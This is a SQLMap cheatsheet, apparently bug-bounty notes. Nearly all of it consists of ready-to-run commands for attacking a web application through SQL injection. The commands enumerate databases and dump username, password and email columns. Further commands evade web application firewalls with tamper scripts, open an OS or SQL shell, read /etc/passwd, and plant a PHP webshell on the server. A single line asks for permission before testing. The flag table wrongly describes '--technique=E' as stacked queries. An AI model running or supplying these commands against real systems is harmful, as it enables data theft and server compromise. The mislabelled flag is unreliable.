# SQLMap Cheatsheet

> **Tool:** SQLMap — Automatic SQL Injection & Database Takeover  
> **Install:** `pip install sqlmap` or `apt install sqlmap`  
> **Only use on targets you have permission to test!**

---

## Attack Flow

```
1. Detect SQLi     → sqlmap -u 'target.com?id=1' --dbs
2. List databases  → --dbs
3. List tables     → -D dbname --tables
4. Dump columns    → -D dbname -T tablename --columns
5. Extract data    → -D dbname -T tablename --dump
6. OS Shell        → --os-shell (if stacked queries work)
```

---

## 01 · Basic Detection

```bash
# GET parameter — simplest test
sqlmap -u 'https://target.com/item?id=1'

# With all good flags (use this as default)
sqlmap -u 'https://target.com/item?id=1' --dbs --batch --random-agent

# Test specific parameter only
sqlmap -u 'https://target.com/search?q=test&id=1' -p id --dbs --batch
```

---

## 02 · POST Request

```bash
# Login form
sqlmap -u https://target.com/login \
  --data 'username=admin&password=test' \
  --dbs --batch

# Maximum coverage on POST
sqlmap -u https://target.com/login \
  --data 'username=admin&password=test' \
  --level=5 --risk=3 --dbs --batch

# Test specific POST param
sqlmap -u https://target.com/search \
  --data 'q=test&category=1' -p category --dbs
```

---

## 03 · Cookie Injection

```bash
# Inject through cookie value
sqlmap -u https://target.com/profile \
  --cookie='user_id=5' --dbs --batch --level=5

# Multiple cookies
sqlmap -u https://target.com/ \
  --cookie='session=abc; id=1' --level=5 --risk=3

# With auth cookie (logged-in session)
sqlmap -u https://target.com/dashboard \
  --cookie='PHPSESSID=xyz123abc' --dbs --batch
```

---

## 04 · Burp Request File

```bash
# Save request from Burp → right-click → Save item
sqlmap -r request.txt --dbs --batch

# Best method — tests ALL params including headers
sqlmap -r request.txt --level=5 --risk=3 --dbs --batch --random-agent
```

---

## 05 · Database Enumeration

```bash
# List all databases
sqlmap -u 'target.com?id=1' --dbs --batch

# List tables in specific DB
sqlmap -u 'target.com?id=1' -D targetdb --tables --batch

# List columns in table
sqlmap -u 'target.com?id=1' -D targetdb -T users --columns --batch

# Dump entire table
sqlmap -u 'target.com?id=1' -D targetdb -T users --dump --batch

# Dump specific columns only
sqlmap -u 'target.com?id=1' -D targetdb -T users \
  -C username,password,email --dump --batch
```

---

## 06 · WAF Bypass — Tamper Scripts

```bash
# Most effective combination
sqlmap -u 'target.com?id=1' \
  --tamper=between,randomcase,space2comment \
  --random-agent --dbs --batch

# Common tamper scripts:
# space2comment    → replaces spaces with /**/
# between          → replaces > with BETWEEN
# randomcase       → rAnDoMiZeS keyword case
# base64encode     → base64 encodes payload
# charencode       → URL-encodes characters
# equaltolike      → replaces = with LIKE
# greatest         → replaces > with GREATEST()

# Heavy WAF bypass combo
sqlmap -u 'target.com?id=1' \
  --tamper=charencode,between,randomcase,space2comment \
  --random-agent --level=5 --risk=3 --batch
```

---

## 07 · OS Shell & File Access

```bash
# Get OS command shell (requires FILE privilege)
sqlmap -u 'target.com?id=1' --os-shell --batch

# Direct SQL shell
sqlmap -u 'target.com?id=1' --sql-shell --batch

# Read file from server
sqlmap -u 'target.com?id=1' --file-read=/etc/passwd

# Write file to server (webshell)
sqlmap -u 'target.com?id=1' \
  --file-write=shell.php --file-dest=/var/www/html/shell.php
```

---

## Key Flags Reference

| Flag | What it does |
|------|-------------|
| `--batch` | Non-interactive — auto-answers all prompts |
| `--random-agent` | Rotate user-agent — basic WAF evasion |
| `--dbs` | Enumerate all databases |
| `--level=5` | Maximum test coverage (1-5) |
| `--risk=3` | Maximum risk payloads (1-3) |
| `--dbms=mysql` | Specify DB type — speeds up detection |
| `--technique=E` | Stacked queries only |
| `--threads=10` | Parallel requests — faster scan |
| `--proxy=http://127.0.0.1:8080` | Route through Burp |
| `-v 3` | Verbose output — see payloads |
| `--output-dir=./results` | Save scan output |

---

## SQLMap Checklist

```
☐  Always use --batch (non-interactive)
☐  Always use --random-agent (WAF evasion)
☐  Start with --dbs to confirm injection first
☐  Use -r request.txt from Burp for best results
☐  --level=5 --risk=3 for thorough scan
☐  Try --tamper scripts if basic scan fails
☐  --os-shell only if you have FILE privilege
☐  Save output: --output-dir=./sqlmap_results
```

---

*Daily Bug Bounty notes — follow for more.*
